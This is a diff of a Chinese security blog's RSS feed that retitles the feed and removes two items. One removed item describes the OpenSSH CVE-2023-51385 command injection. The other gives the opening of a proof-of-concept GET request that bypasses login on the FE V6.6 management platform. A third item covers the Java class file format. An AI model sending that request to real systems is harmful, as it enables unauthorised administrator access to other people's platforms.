@@ -1,13 +1,13 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Posts on k9blog</title>
-    <link>https://Ky9oss.github.io/posts/</link>
-    <description>Recent content in Posts on k9blog</description>
+    <title>basics on k9blog</title>
+    <link>https://Ky9oss.github.io/tags/basics/</link>
+    <description>Recent content in basics on k9blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
     <lastBuildDate>Fri, 29 Dec 2023 01:55:48 +0800</lastBuildDate>
-    <atom:link href="https://Ky9oss.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="https://Ky9oss.github.io/tags/basics/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Java Class文件细节剖析</title>
       <link>https://Ky9oss.github.io/posts/java-class%E6%96%87%E4%BB%B6%E7%BB%86%E8%8A%82%E5%89%96%E6%9E%90/</link>
@@ -23,25 +23,6 @@ constant pool 在Java代码中，如果涉及到一些数字的操作，对于�
 当整型变量以final修饰时，它被声明为一个常量，此时才会加入常量池。
 constant_pool中每一个cp_info元素又可分为两个部分：
 tag：通常为1个字节，用于表示该常量项的类型； info：该常量项的具体内容，根据不同类型的实际数据占用不同的字节长度； access flag 就是类上的修饰符，如final、abstract等 this class 类索引保存的是一个与类相关的索引，指向的数据是前面提到的常量池。</description>
-    </item>
-    <item>
-      <title>CVE-2023-51385</title>
-      <link>https://Ky9oss.github.io/posts/cve-2023-51385/</link>
-      <pubDate>Thu, 28 Dec 2023 14:20:16 +0800</pubDate>
-      <guid>https://Ky9oss.github.io/posts/cve-2023-51385/</guid>
-      <description>Description Vulnerability Description In ssh in OpenSSH before 9.6, OS command injection might occur if a user name or host name has shell metacharacters, and this name is referenced by an expansion token in certain situations. For example, an untrusted Git repository can have a submodule with shell metacharacters in a user name or host name
-Affected Version OpenSSH version &amp;lt; 9.6
-Details Vulnerability Reproduction Write these code in ~/.ssh/config</description>
-    </item>
-    <item>
-      <title>CVE-FE66-2023-003</title>
-      <link>https://Ky9oss.github.io/posts/cve-fe66-2023-003/</link>
-      <pubDate>Thu, 28 Dec 2023 14:20:16 +0800</pubDate>
-      <guid>https://Ky9oss.github.io/posts/cve-fe66-2023-003/</guid>
-      <description>Description Vulnerability Description Feiqi Interconnect - FE Corporate Operations Management Platform is a cloud workstation based on technologies such as cloud computing, intelligence, big data, the Internet of Things, and mobile internet. The FE Corporate Operations Management Platform V6.6 can bypass login authentication and enter the administrator interface.
-Affected Version FE V6.6
-Details Vulnerability Reproduction POC
-GET /2.ln?SYS_LINK=77507068764957484a5067777862714f457a66574871642f4330574c76717868394a35496d37416c497951724f33446f51486375685a5a2b31684938472b7056 HTTP/1.1 Host: your-ip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.</description>
     </item>
   </channel>
 </rss>
